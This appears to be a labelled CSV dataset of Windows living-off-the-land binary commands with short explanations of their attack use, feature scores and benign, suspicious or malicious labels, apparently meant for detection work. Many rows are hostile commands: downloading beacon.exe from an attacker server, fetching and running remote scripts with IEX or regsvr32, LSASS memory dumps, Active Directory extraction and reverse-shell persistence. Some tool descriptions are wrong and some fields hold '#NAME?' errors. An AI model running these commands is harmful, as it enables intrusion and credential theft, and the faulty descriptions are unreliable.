prompt,response,Lolbin (0.05),Content (0.4),Frequency (0.2),Source (0.1),Network (0.1),Behavioural (0.1),History (0.05),Score,Label
MavInject.exe 3110 /INJECTRUNNING c:\\folder\\evil.dll,"This command can be used to inject a malicious DLL into a running process, allowing an attacker to execute arbitrary code within the context of that process.",MavInject.exe,c:\\folder\\evil.dll,none,c:\\folder\\evil.dll,3110,/INJECTRUNNING,none,0.75,malicious
"Mavinject.exe 4172 /INJECTRUNNING ""c:\\ads\\file.txt:file.dll""","This command can be used to inject a malicious DLL into a running process, allowing an attacker to execute arbitrary code within the context of that process.",MavInject.exe,c:\\ads\\file.txt:file.dll,none,c:\\ads\\file.txt:file.dll,4172,/INJECTRUNNING,none,0.75,malicious
Microsoft.Workflow.Compiler.exe tests.xml results.xml,"Potential use in a cyberattack: Compiling and executing malicious code in a workflow to evade detection.

What it might do on a Windows machine: Compiles a workflow file (tests.xml) and saves the results to another file (results.xml).",Microsoft.Workflow.Compiler.exe,results.xml,none,tests.xml,none,none,none,0.55,suspicious
Microsoft.Workflow.Compiler.exe tests.txt results.txt,This command is used to compile a Microsoft Workflow file and can potentially be used to execute malicious code or scripts on a Windows machine.,Microsoft.Workflow.Compiler.exe,results.txt,none,tests.txt,none,none,none,0.55,suspicious
mmc.exe -Embedding c:\\path\\to\\test.msc,This command can be used to execute a Microsoft Management Console (MMC) snap-in and potentially allow an attacker to perform administrative tasks on a compromised machine.,mmc.exe,c:\\path\\to\\test.msc,none,c:\\path\\to\\test.msc,none,#NAME?,none,0.65,malicious
MpCmdRun.exe -DownloadFile -url https://attacker.server/beacon.exe -path c:\\\\temp\\\\beacon.exe,This command can be used to download a malicious file from an attacker-controlled server and save it to a specific location on the victim's machine using Windows Defender's MpCmdRun.exe utility.,MpCmdRun.exe,c:\\\\temp\\\\beacon.exe,none,https://attacker.server/beacon.exe,none,#NAME?,none,0.65,malicious
MpCmdRun.exe -DownloadFile -url https://attacker.server/beacon.exe -path c:\\\\temp\\\\nicefile.txt:evil.exe,"This command can be used to download a malicious file from an attacker-controlled server and save it as a benign-looking file in a temporary directory on the victim's machine, potentially bypassing security controls.",MpCmdRun.exe,c:\\\\temp\\\\nicefile.txt:evil.exe,none,https://attacker.server/beacon.exe,none,#NAME?,none,0.65,malicious
msbuild.exe pshell.xml,"Potential use: Execute PowerShell scripts without invoking powershell.exe, which may bypass security restrictions.

What it does: Executes the MSBuild tool with the specified project file (pshell.xml), which may contain PowerShell code to be executed.",msbuild.exe,pshell.xml,none,none,none,none,none,0.45,suspicious
msbuild.exe project.csproj,"Potential use: Build malicious code or execute arbitrary code.
What it does: Compiles a Visual Studio project file into an executable or library.",msbuild.exe,project.csproj,none,none,none,none,none,0.45,suspicious
Msconfig.exe -5,"This command does not exist. The correct command is ""msconfig"" and it is used to configure system startup and services. It could potentially be used to disable security software or enable malicious services during a cyberattack.",Msconfig.exe,none,none,none,none,-5,none,0.15,benign
msdt.exe -path C:\\WINDOWS\\diagnostics\\index\\PCWDiagnostic.xml -af C:\\PCW8E57.xml /skip TRUE,This command can be used to run a Windows diagnostic tool and potentially gather system information for reconnaissance purposes.,msdt.exe,C:\\PCW8E57.xml,none, C:\\WINDOWS\\diagnostics\\index\\PCWDiagnostic.xml,none,"-af,/skip",none,0.65,malicious
msdt.exe -path C:\\WINDOWS\\diagnostics\\index\\PCWDiagnostic.xml -af C:\\PCW8E57.xml /skip TRUE,This command can be used to run a Windows diagnostic tool and potentially gather system information for reconnaissance purposes.,msdt.exe,C:\\PCW8E57.xml,none, C:\\WINDOWS\\diagnostics\\index\\PCWDiagnostic.xml,none,"-af,/skip",none,0.65,malicious
mshta.exe evilfile.hta,This command can be used to execute malicious code embedded in an HTA file and potentially gain remote access to a Windows machine.,mshta.exe,evilfile.hta,none,none,none,none,none,0.45,suspicious
"mshta.exe ""C:\\ads\\file.txt:file.hta""","This command can be used to execute a malicious HTA file disguised as a harmless text file, allowing an attacker to run arbitrary code on the victim's machine.",mshta.exe,C:\\ads\\file.txt:file.hta,none,C:\\ads\\file.txt:file.hta,none,none,none,0.45,suspicious
msiexec /quiet /i cmd.msi,"This command can be used to silently install a malicious payload (in this case, cmd.msi) on a victim's machine without their knowledge or consent.",msiexec,cmd.msi,none,none,none,"/quiet,/i",none,0.45,suspicious
netsh.exe add helper C:\\Users\\User\\file.dll,"This command can be used to add a malicious DLL file as a helper to a network configuration, allowing an attacker to intercept and manipulate network traffic.",netsh.exe,C:\\Users\\User\\file.dll,none,C:\\Users\\User\\file.dll,none,add,none,0.65,malicious
odbcconf -f file.rsp,"This command can be used to install or configure ODBC drivers and data sources, which can be useful for accessing and exfiltrating data from databases on a compromised machine.",odbcconf,file.rsp,none,none,none,#NAME?,none,0.55,suspicious
pcalua.exe -a calc.exe,"This command can be used to execute the Windows Calculator (calc.exe) with elevated privileges, potentially allowing an attacker to bypass security measures and gain access to sensitive information on the machine.",pcalua.exe,calc.exe,none,none,none,#NAME?,none,0.55,suspicious
Pcwrun.exe c:\\temp\\beacon.exe,This command can be used to execute a beacon payload from a temporary directory on a compromised Windows machine.,Pcwrun.exe,c:\\temp\\beacon.exe,none,c:\\temp\\beacon.exe,none,none,none,0.55,suspicious
pktmon.exe start --etw,"Potential use: Network reconnaissance and monitoring.
What it does: Starts packet capture and logging using Event Tracing for Windows (ETW) for network traffic analysis.",pktmon.exe,none,none,none,none,"start,--etw",none,0.15,benign
pnputil.exe -i -a C:\\Users\\hai\\Desktop\\mo.inf,"This command can be used to install a malicious driver on a Windows machine, potentially allowing for persistence or privilege escalation.",pnputil.exe,C:\\Users\\hai\\Desktop\\mo.inf,none,C:\\Users\\hai\\Desktop\\mo.inf,none,"-I,-a",none,0.65,malicious
Presentationhost.exe C:\\temp\\Evil.xbap,"This command can be used to execute a malicious .xbap file from a specified location on the victim's machine, potentially allowing an attacker to gain remote access or execute further attacks.",Presentationhost.exe,C:\\temp\\Evil.xbap,none,C:\\temp\\Evil.xbap,none,none,none,0.55,suspicious
print /D:C:\\ADS\\File.txt:file.exe C:\\ADS\\File.exe,"This command can be used to hide a malicious executable within an Alternate Data Stream (ADS) of a legitimate file, making it difficult to detect and allowing for persistence on the system.",print,C:\\ADS\\File.exe,none,C:\\ADS\\File.txt:file.exe,none,/D,none,0.65,malicious
print /D:C:\\ADS\\CopyOfFile.exe C:\\ADS\\FileToCopy.exe,"This command prints a file to a printer, but it could potentially be used to hide a file within an Alternate Data Stream (ADS) and execute it from there.",print,C:\\ADS\\FileToCopy.exe,none,C:\\ADS\\CopyOfFile.exe,none,/D,none,0.65,malicious
psr.exe /start /output D:\\test.zip /sc 1 /gui 0,"This command can be used to record user actions and take screenshots, potentially capturing sensitive information, and save them to a compressed file on the D drive without displaying the recording interface.",psr.exe,D:\\test.zip,none,none,none,"/start,/output,/sc",none,0.55,suspicious
rasautou -d powershell.dll -p powershell -a a -e e,"This command can be used to execute PowerShell code from within a Remote Access Service (RAS) session, potentially allowing an attacker to bypass security measures and execute malicious code on a compromised machine.",rasautou,powershel.dll,powershell,powershell,none,"-d,-p,-a,-e",none,0.85,malicious
reg export HKLM\\SOFTWARE\\Microsoft\\Evilreg c:\\ads\\file.txt:evilreg.reg,"This command exports the registry key ""HKLM\SOFTWARE\Microsoft\Evilreg"" to a file named ""evilreg.reg"" in the ""c:\ads\file.txt"" directory, which could potentially be used to steal sensitive information or modify system settings.",reg ,c:\\ads\\file.txt:evilreg.reg,none, HKLM\\SOFTWARE\\Microsoft\\Evilreg,none,export,none,0.65,malicious
regasm.exe AllTheThingsx64.dll,"Registers a .NET assembly as a COM component, potentially allowing an attacker to execute arbitrary code on the system.",regasm.exe,AllTheThingsx64.dll,none,none,none,none,none,0.45,suspicious
regasm.exe /U AllTheThingsx64.dll,"This command can be used to register a malicious .dll file as a COM object, allowing an attacker to execute arbitrary code on the compromised system.",regasm.exe,AllTheThingsx64.dll,none,none,none,/U,none,0.55,suspicious
regedit /E c:\\ads\\file.txt:regfile.reg HKEY_CURRENT_USER\\MyCustomRegKey,"This command exports the registry key ""MyCustomRegKey"" under HKEY_CURRENT_USER to a file named ""file.txt:regfile.reg"" in the ""c:\ads"" directory, which could potentially be used to steal sensitive information or modify system settings.",regedit,HKEY_CURRENT_USER\\MyCustomRegKey,none,c:\\ads\\file.txt:regfile.reg,none,/exe,none,0.65,malicious
regini.exe newfile.txt:hidden.ini,"This command can be used to hide a file (hidden.ini) by modifying the registry settings through a script (newfile.txt), which can be used in a cyberattack to conceal malicious files or data on a Windows machine.",regini.exe,newfile.txt:hidden.ini,none,none,none,none,none,0.45,suspicious
"Register-cimprovider -path ""C:\\folder\\evil.dll""","This command can be used to register a malicious CIM provider DLL file, which can then be used to execute arbitrary code on the compromised system.",Register-cimprovider,C:\\folder\\evil.dll,none,C:\\folder\\evil.dll,none,#NAME?,none,0.65,malicious
regsvcs.exe AllTheThingsx64.dll,This command can be used to execute arbitrary code and potentially achieve persistence on a compromised Windows machine.,regsvcs.exe,AllTheThingsx64.dll,none,none,none,none,none,0.45,suspicious
regsvcs.exe AllTheThingsx64.dll,This command can be used to execute arbitrary code and potentially achieve persistence on a compromised Windows machine.,regsvcs.exe,AllTheThingsx64.dll,none,none,none,none,none,0.45,suspicious
regsvr32 /s /n /u /i:http://example.com/file.sct scrobj.dll,"This command can be used to execute a malicious script hosted on a remote server and inject it into the scrobj.dll library, allowing an attacker to gain persistence and potentially execute further malicious actions on the compromised machine.",regsvr32,scrobj.dll,none,http://example.com/file.sct,none,"/s,/n,/u,/i",none,0.65,malicious
regsvr32 /s /n /u /i:http://example.com/file.sct scrobj.dll,"This command can be used to execute a malicious script hosted on a remote server and inject it into the scrobj.dll library, potentially allowing an attacker to gain remote access to the compromised machine.",regsvr32,scrobj.dll,none,http://example.com/file.sct,none,"/s,/n,/u,/i",none,0.65,malicious
replace.exe C:\\Source\\File.cab C:\\Destination /A,"This command can be used to replace a file on a Windows machine and potentially overwrite important system files, allowing an attacker to gain persistence or execute malicious code.",replace.exe,C:\\Destination /A,none,C:\\Source\\File.cab,none,none,none,0.55,suspicious
replace.exe \\\\webdav.host.com\\foo\\bar.exe c:\\outdir /A,"This command can be used to replace a legitimate executable with a malicious one on a remote machine, potentially allowing for remote code execution.",replace.exe,c:\\outdir /A,none,\\\\webdav.host.com\\foo\\bar.exe,none,none,none,0.55,suspicious
rpcping -s 127.0.0.1 -e 1234 -a privacy -u NTLM,"This command can be used to test RPC connectivity and authentication, and in a cyberattack, it can be used to check if RPC is enabled and accessible on a target machine and potentially exploit it by establishing a connection and executing commands remotely.",rpcping,none,none,none,127.0.0.1,"-s,-e,-a,-u",none,0.25,benign
rundll32.exe AllTheThingsx64,This is not a valid command.,rundll32.exe,none,none,none,none,none,none,0.05,benign
"rundll32 ""C:\\ads\\file.txt:ADSDLL.dll""","This command can be used to execute a DLL file hidden in an Alternate Data Stream (ADS) of a text file, potentially allowing an attacker to execute malicious code on a Windows machine.",rundll32 ,C:\\ads\\file.txt:ADSDLL.dll,none,C:\\ads\\file.txt,none,none,none,0.45,suspicious
Runonce.exe /AlternateShellStartup,"Potential use: Persistence and privilege escalation.
What it does: Executes a command or script once during the next boot of the system, using an alternate shell instead of the default one.",Runonce.exe,none,none,none,none,/AlternateShellStartup,none,0.15,benign
runscripthelper.exe surfacecheck \\\\?\\C:\\Test\\Microsoft\\Diagnosis\\scripts\\test.txt C:\\Test,"This command runs a script helper tool to check the surface of a file located at C:\Test\Microsoft\Diagnosis\scripts\test.txt and save the results in C:\Test, which could potentially be used to gather information about the file system and identify vulnerabilities.",runscripthelper.exe,C:\\Test,none,C:\\Test\\Microsoft\\Diagnosis\\scripts\\test.txt,none,surfacecheck,none,0.65,malicious
"sc create evilservice binPath=""\\""c:\\\\ADS\\\\file.txt:cmd.exe\\"" /c echo works > \\""c:\\ADS\\works.txt\\"""" DisplayName= ""evilservice"" start= auto\\ & sc start evilservice","This command creates a Windows service that executes a command to write ""works"" to a file in an Alternate Data Stream, allowing for stealthy persistence and execution of malicious code.",sc,c:\\ADS\\works.txt\\,evilservice,c:\\\\ADS\\\\file.txt:cmd.exe\\,none,"create,echo,start",none,0.85,malicious
"schtasks /create /sc minute /mo 1 /tn ""Reverse shell"" /tr c:\\some\\directory\\revshell.exe","This command creates a scheduled task that runs a reverse shell executable every minute, allowing an attacker to maintain persistent access to the compromised machine.",schtasks,c:\\some\\directory\\revshell.exe,none,c:\\some\\directory\\revshell.exe,none,"/create,/sc,/mo,/tn,/tr",none,0.65,malicious
Scriptrunner.exe -appvscript calc.exe,"This command can be used to execute the Windows calculator (calc.exe) through the ScriptRunner application, potentially allowing an attacker to run arbitrary code or commands on a compromised machine.",Scriptrunner.exe,calc.exe,none,none,none,#NAME?,none,0.55,suspicious
"SyncAppvPublishingServer.exe ""n;(New-Object Net.WebClient).DownloadString(\'http://some.url/script.ps1\') | IEX""","This command can be used to download and execute a PowerShell script from a remote server, potentially allowing an attacker to execute arbitrary code on the compromised machine.",SyncAppvPublishingServer.exe,New-Object Net.WebClient,none,http://some.url/script.ps1,none,"DownloadString, IEX",none,0.65,malicious
"TTDInject.exe /ClientParams ""7 tmp.run 0 0 0 0 0 0 0 0 0 0"" /Launch ""C:/Windows/System32/calc.exe""","This command injects a DLL into a running process and launches the Windows calculator, potentially allowing an attacker to execute arbitrary code on the compromised machine.",TTDInject.exe,C:/Windows/System32/calc.exe,none,7 tmp.run 0 0 0 0 0 0 0 0 0 0,none,"/ClientParams,/Launch",none,0.65,malicious
tttracer.exe C:\\windows\\system32\\calc.exe,"This command can be used to execute the Windows calculator (calc.exe) in a hidden manner, potentially as a decoy while other malicious activities are being carried out.",tttracer.exe,C:\\windows\\system32\\calc.exe,none,C:\\windows\\system32\\calc.exe,none,none,none,0.55,suspicious
TTTracer.exe -dumpFull -attach pid,"Potential use: Dumping memory of a specific process for analysis.
What it does: Dumps the full memory of a process with a specific process ID.",TTTracer.exe,none,none,none,none,"-dumpfull,-attach",none,0.15,benign
vbc.exe /target:exe c:\\temp\\vbs\\run.vb,"This command can be used to compile a VBScript file into an executable file, which can then be used to execute malicious code on a Windows machine.",vbc.exe,c:\\temp\\vbs\\run.vb,none,c:\\temp\\vbs\\run.vb,none,/target:exe,none,0.65,malicious
verclsid.exe /S /C {CLSID},"This command can be used to check the version of a COM object and potentially identify vulnerable versions, or to execute a malicious COM object with a specific CLSID.",verclsid.exe,CLSID,none,none,none,"/S,/C",none,0.55,suspicious
wab.exe,"Potential use in a cyberattack: Harvest email addresses and contact information from Windows Address Book.
What it might do on a Windows machine: Launch the Windows Address Book application.",wab.exe,none,none,none,none,none,none,0.05,benign
"wmic.exe process call create ""c:\\ads\\file.txt:program.exe""","This command can be used to execute a program hidden within an Alternate Data Stream (ADS) of a file, allowing an attacker to bypass detection and execute malicious code on a Windows machine.",wmic.exe,c:\\ads\\file.txt:program.exe,none,c:\\ads\\file.txt:program.exe,none,create,none,0.65,malicious
wmic.exe process call create calc,"Potential use: Execute a calculator program on a remote Windows machine.
What it does: Creates a new process to run the Windows calculator program.",wmic.exe,calc,none,none,none,create,none,0.55,suspicious
wscript c:\\ads\\file.txt:script.vbs,"This command can be used to execute a VBScript file located in a hidden Alternate Data Stream (ADS) of a text file, allowing an attacker to hide their malicious code and evade detection.",wscript ,c:\\ads\\file.txt:script.vbs,none,c:\\ads\\file.txt,none,none,none,0.55,suspicious
wsreset.exe,"Potential use in a cyberattack: Resetting Windows Store cache to bypass application whitelisting or to clear traces of malicious activity.
What it might do on a Windows machine: Reset Windows Store cache and delete all installed apps' data.",wsreset.exe,none,none,none,none,none,none,0.05,benign
wuauclt.exe /UpdateDeploymentProvider <Full_Path_To_DLL> /RunHandlerComServer,This command can be used to execute a malicious DLL file and potentially download and install additional malware onto the compromised machine.,wuauclt.exe,<Full_Path_To_DLL>,none,<Full_Path_To_DLL>,none,"/UpdateDeploymentProvider,/RunHandlerComServer",none,0.65,malicious
xwizard RunWizard {00000001-0000-0000-0000-0000FEEDACDC},This command can be used to execute a custom wizard and could potentially be used in a cyberattack to run a malicious wizard on a Windows machine.,xwizard,00000001-0000-0000-0000-0000FEEDACDC,none,none,none,RunWizard,none,0.55,suspicious
xwizard RunWizard {7940acf8-60ba-4213-a7c3-f3b400ee266d} /zhttps://pastebin.com/raw/iLxUT5gM,This command can be used to execute a malicious script hosted on a remote server and potentially download and execute additional malware on the Windows machine.,xwizard,7940acf8-60ba-4213-a7c3-f3b400ee266d,none,https://pastebin.com/raw/iLxUT5gM,none,RunWizard,none,0.65,malicious
xwizard RunWizard {7940acf8-60ba-4213-a7c3-f3b400ee266d} /zhttps://10.10.10.10/raw/iLxUT5gM,This command can be used to run a specific wizard on a Windows machine and the potential use in a cyberattack for 'living off the land' could be to execute a malicious wizard that could install malware or perform other malicious actions on the system.,xwizard,7940acf8-60ba-4213-a7c3-f3b400ee266d,none,https://10.10.10.10/raw/iLxUT5gM,10.10.10.10,RunWizard,none,0.76,malicious
xwizard RunWizard {7940acf8-60ba-4213-a7c3-f3b400ee266d} /zhttps://11.11.11.11/raw/iLxUT5gM,This command can be used to run a wizard on a Windows machine and the potential use in a cyberattack for 'living off the land' is to execute a malicious script or payload through the wizard.,xwizard,7940acf8-60ba-4213-a7c3-f3b400ee266d,none,https://11.11.11.11/raw/iLxUT5gM,11.11.11.11,RunWizard,none,0.75,malicious
rundll32.exe advpack.dll,This command can be used to execute malicious code or install malware through the installation of ActiveX controls or other software packages.,rundll32.exe,advpack.dll,none,none,none,none,none,0.45,suspicious
rundll32.exe advpack.dll,This command can be used to execute malicious code or install malware through the installation of ActiveX controls or other software packages.,rundll32.exe,advpack.dll,none,none,none,none,none,0.45,suspicious
"rundll32 C:\\windows\\system32\\comsvcs.dll MiniDump ""[LSASS_PID] dump.bin full""","This command can be used to dump the memory of the Local Security Authority Subsystem Service (LSASS) process, which contains sensitive information such as passwords, and can be used for further analysis or exploitation.",rundll32 ,[LSASS_PID] dump.bin,none,C:\\windows\\system32\\comsvcs.dll,none,none,none,0.55,suspicious
rundll32.exe ieadvpack.dll,This command can be used to execute arbitrary code and potentially download and install malware on a Windows machine.,rundll32.exe,ieadvpack.dll,none,none,none,none,none,0.45,suspicious
rundll32.exe ieadvpack.dll,This command can be used to execute arbitrary code and potentially download and install malware on a Windows machine.,rundll32.exe,ieadvpack.dll,none,none,none,none,none,0.45,suspicious
rundll32.exe ieframe.dll,This command can be used to launch Internet Explorer and potentially execute malicious code or download additional malware onto the system.,rundll32.exe,ieframe.dll,none,none,none,none,none,0.45,suspicious
rundll32.exe Mshtml.dll,"Potential use: Execute malicious code through a legitimate Windows process.
What it does: Loads the Mshtml.dll library and executes any exported function within it.",rundll32.exe,Mshtml.dll,none,none,none,none,none,0.45,suspicious
rundll32.exe pcwutl.dll,"This command is used to launch the Performance Monitor Wizard, which could potentially be used to gather system performance data for reconnaissance purposes in a cyberattack.",rundll32.exe,pcwutl.dll,none,none,none,none,none,0.45,suspicious
rundll32.exe setupapi.dll,"Potential use: Execute malicious code or load a malicious DLL file.
What it does: Runs a function in setupapi.dll, which is used for installing device drivers and other system components.",rundll32.exe,setupapi.dll,none,none,none,none,none,0.45,suspicious
rundll32.exe setupapi.dll,"Potential use: Execute malicious code or load a malicious DLL file.
What it does: Runs a function in setupapi.dll, which is used for installing device drivers and other system components.",rundll32.exe,setupapi.dll,none,none,none,none,none,0.45,suspicious
rundll32.exe shdocvw.dll,This command can be used to execute arbitrary code and potentially download and execute additional malware on a Windows machine.,rundll32.exe,shdocvw.dll,none,none,none,none,none,0.45,suspicious
rundll32.exe shell32.dll,"Potential use: Execute shell commands from DLL files.
What it does: Loads the shell32.dll file and executes the specified command.",rundll32.exe,shell32.dll,none,none,none,none,none,0.45,suspicious
rundll32.exe syssetup.dll,"Potential use: Execute malicious code or load a malicious DLL file.
What it does: Launches the System Setup process, which can be used to install or uninstall Windows components and drivers.",rundll32.exe,syssetup.dll,none,none,none,none,none,0.45,suspicious
rundll32 syssetup.dll,"Potential use: Execute code from a DLL file.
What it does: Launches the Windows Setup API, which can be used to install or uninstall Windows components and updates.",rundll32 ,syssetup.dll,none,none,none,none,none,0.45,suspicious
rundll32.exe url.dll,"Can be used to launch a URL or execute a DLL file, potentially used to download and execute malicious code.",rundll32.exe,url.dll,none,none,none,none,none,0.45,suspicious
rundll32.exe zipfldr.dll,"Potential use: Compress or extract files.
What it does: Opens the built-in Windows zip folder interface.",rundll32.exe,zipfldr.dll,none,none,none,none,none,0.45,suspicious
adplus.exe -hang -pn lsass.exe -o c:\\users\\mr.d0x\\output\\folder -quiet,"This command can be used to capture a memory dump of the Local Security Authority Subsystem Service (LSASS) process, which contains sensitive information such as passwords, and save it to a specified output folder for later analysis.",adplus.exe,c:\\users\\mr.d0x\\output\\folder,none,lsass.exe,none,"-hang,-pn,-o,-quiet",none,0.65,malicious
"AgentExecutor.exe -powershell ""c:\\temp\\malicious.ps1"" ""c:\\temp\\test.log"" ""c:\\temp\\test1.log"" ""c:\\temp\\test2.log"" 60000 ""C:\\Windows\\SysWOW64\\WindowsPowerShell\\v1.0"" 0 1","This command can be used to execute a PowerShell script (malicious.ps1) with arguments and log the output to specified files, potentially allowing an attacker to execute arbitrary code and maintain persistence on a Windows machine.",AgentExecutor.exe,"c:\\temp\\test.log,c:\\temp\\test1.log,c:\\temp\\test2.log",none,c:\\temp\\malicious.ps1,none,"powershell,60000",none,0.65,malicious
AppVLP.exe \\\\webdav\\calc.bat,"This command can be used to execute a batch file hosted on a remote server, potentially allowing an attacker to run malicious code on a victim's machine.",AppVLP.exe,\\\\webdav\\calc.bat,none,\\\\webdav\\calc.bat,none,none,none,0.55,suspicious
AppVLP.exe \\\\10.10.10.10\\calc.bat,"This command can be used to execute a batch file containing malicious code on a remote machine, potentially allowing an attacker to gain access or control over the machine.",AppVLP.exe,\\\\10.10.10.10\\calc.bat,none,\\\\10.10.10.10\\calc.bat,10.10.10.10,none,none,0.65,malicious
bginfo.exe bginfo.bgi /popup /nolicprompt,"Displays system information on the desktop background, potentially useful for reconnaissance and information gathering during a cyberattack.",bginfo.exe,bginfo.bgi,none,none,none,"/popup,/nolicprompt",none,0.55,suspicious
bginfo.exe bginfo.bgi /popup /nolicprompt,"Displays system information on the desktop background, potentially useful for reconnaissance and information gathering during a cyberattack.",bginfo.exe,bginfo.bgi,none,none,none,"/popup,/nolicprompt",none,0.55,suspicious
cdb.exe -cf x64_calc.wds -o notepad.exe,"This command can be used to create a malicious payload by converting a Windows Debugger Script (WDS) file containing shellcode into an executable file (notepad.exe) using the Crash Dump Builder (cdb.exe) tool, which can then be used to execute arbitrary code on a target machine.",cdb.exe,x64_calc.wds,none,none,none,"-cf,-o",none,0.55,suspicious
coregon.exe.exe /L C:\\folder\\evil.dll dummy_assembly_name,This command can be used to execute a malicious DLL file (evil.dll) under the guise of a legitimate process (dummy_assembly_name) in order to evade detection and perform malicious actions on the compromised Windows machine.,coregon.exe,C:\\folder\\evil.dll dummy_assembly_name,none,C:\\folder\\evil.dll dummy_assembly_name,none,/L,none,0.65,malicious
coregen.exe /L C:\\folder\\evil.dll dummy_assembly_name,"This command can be used to generate a malicious DLL file and load it into memory, potentially allowing an attacker to execute arbitrary code on the compromised system.",coregen.exe,C:\\folder\\evil.dll dummy_assembly_name,none,C:\\folder\\evil.dll dummy_assembly_name,none,/L,none,0.65,malicious
csi.exe file,"Potential use in a cyberattack: It can be used to analyze and collect forensic data from a Windows machine.
What it might do on a Windows machine: It will launch the Windows forensic tool, Computer System Investigation (CSI), which can collect information about running processes, network connections, and system configuration.",csi.exe,file,none,none,none,none,none,0.45,suspicious
"DefaultPack.EXE /C:""process.exe args""",This command can be used to execute a process with arguments and can be used in a living off the land attack to run malicious code or execute a payload on a Windows machine.,DefaultPack.EXE,"/C:""process.exe args""",none,"/C:""process.exe args""",none,none,none,0.55,suspicious
"devtoolslauncher.exe LaunchForDeploy [PATH_TO_BIN] ""argument here"" test",This command can be used to launch a binary for deployment and testing purposes.,devtoolslauncher.exe,PATH_TO_BIN,none,none,none,"LaunchForDeploy,test",none,0.55,suspicious
dnx.exe consoleapp,"Potential use in a cyberattack: Running a console application to execute malicious code or commands.
What it might do on a Windows machine: Launches the .NET Execution Environment (DNX) to run a console application on a Windows machine.",dnx.exe,none,none,none,none,consoleapp,none,0.15,benign
dotnet.exe [PATH_TO_DLL],Execute a .NET assembly and potentially load a malicious DLL for code execution or persistence.,dotnet.exe,PATH_TO_DLL,none,PATH_TO_DLL,none,none,none,0.55,suspicious
dotnet.exe [PATH_TO_DLL],Execute a .NET assembly and potentially load a malicious DLL for code execution or persistence.,dotnet.exe,PATH_TO_DLL,none,PATH_TO_DLL,none,none,none,0.55,suspicious
Dxcap.exe -c C:\\Windows\\System32\\notepad.exe,"This command captures network traffic and saves it to a file, while also launching Notepad. 

Potential use in a cyberattack: Capture sensitive information being transmitted over the network while also distracting the user with a harmless Notepad window.",Dxcap.exe,C:\\Windows\\System32\\notepad.exe,none,C:\\Windows\\System32\\notepad.exe,none,-c,none,0.65,malicious
Excel.exe http://192.168.1.10/TeamsAddinLoader.dll,"Potential use: Download and execute a malicious DLL from a remote server using a trusted application.

What it does: Executes Microsoft Excel and loads a Teams add-in DLL from a remote server, which could potentially contain malicious code.",Excel.exe,http://192.168.1.10/TeamsAddinLoader.dll,none,http://192.168.1.10/TeamsAddinLoader.dll,192.168.1.10,none,none,0.65,malicious
Mftrace.exe cmd.exe,This command can be used to execute arbitrary commands through cmd.exe and potentially bypass security measures.,Mftrace.exe,cmd.exe,none,none,none,none,none,0.45,suspicious
"msdeploy.exe -verb:sync -source:RunCommand -dest:runCommand=""c:\\temp\\calc.bat""","This command can be used to execute a batch file containing malicious code on a target machine, potentially allowing an attacker to gain remote access or execute further commands.",msdeploy.exe,c:\\temp\\calc.bat,RunCommand,c:\\temp\\calc.bat,none,"-verb:sync,-source:RunCommand",none,0.85,malicious
"msdeploy.exe -verb:sync -source:RunCommand -dest:runCommand=""c:\\temp\\calc.bat""","This command can be used to execute a batch file containing malicious code on a target machine, potentially allowing an attacker to gain remote access or execute further commands.",msdeploy.exe,c:\\temp\\calc.bat,RunCommand,c:\\temp\\calc.bat,none,"-verb:sync,-source:RunCommand",none,0.85,malicious
msxsl.exe customers.xml script.xsl,"This command can be used to execute an XSL script on an XML file, potentially allowing an attacker to extract sensitive information from the XML file or modify its contents.",msxsl.exe,customers.xml,none,script.xsl,none,none,none,0.55,suspicious
msxsl.exe customers.xml script.xsl,"This command can be used to execute an XSL script on an XML file, potentially allowing an attacker to extract sensitive information from the XML file or modify its contents.",msxsl.exe,customers.xml,none,script.xsl,none,none,none,0.55,suspicious
"ntdsutil.exe ""ac i ntds"" ""ifm"" ""create full c:\\"" q q","This command can be used to create a full copy of the Active Directory database on a Windows machine, which can be used for offline analysis or to extract sensitive information such as user credentials.",ntdsutil.exe,c:\\,none,c:\\,none,"ac,ifm,create,q",none,0.65,malicious
"Powerpnt.exe ""http://192.168.1.10/TeamsAddinLoader.dll""","This command could potentially download and execute a malicious DLL file from a remote server, allowing an attacker to gain persistence and potentially execute further malicious actions on the compromised machine.",Powerpnt.exe,http://192.168.1.10/TeamsAddinLoader.dll,none,http://192.168.1.10/TeamsAddinLoader.dll,192.168.1.10,none,none,0.65,malicious
